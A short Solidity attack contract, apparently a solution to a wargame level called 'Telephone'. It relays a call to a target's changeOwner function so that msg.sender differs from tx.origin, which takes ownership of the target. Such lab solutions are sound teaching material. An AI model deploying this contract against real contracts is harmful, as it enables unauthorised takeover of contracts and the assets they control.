// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface TelephoneContract {
    function changeOwner(address _owner) external;
}

contract TelephoneHacker {
    address telephoneInstance;

    constructor (address _telephoneInstance) {
        telephoneInstance = _telephoneInstance;
    }

    function setInstance(address _telephoneInstance) public {
        telephoneInstance = _telephoneInstance;
    }

    function changeOwner() public {
        TelephoneContract(telephoneInstance).changeOwner(msg.sender);
    }
}